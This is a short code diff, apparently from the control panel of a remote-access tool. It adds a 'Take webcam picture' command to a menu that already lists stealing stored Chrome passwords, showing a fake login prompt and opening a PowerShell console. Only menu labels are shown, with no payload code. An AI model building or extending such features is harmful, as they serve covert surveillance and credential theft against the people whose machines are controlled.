@@ -23,7 +23,8 @@ const commands = {
     'webPass': 'Get Stored Chrome Passwords',
     'PromptUser': 'Prompt User UI Login',
     'get-network': 'Get Network Information',
-    'StartPS': 'Start Powershell Console'
+    'StartPS': 'Start Powershell Console',
+    'smile': 'Take webcam picture'
 }
 
 const ClientControl = () => {
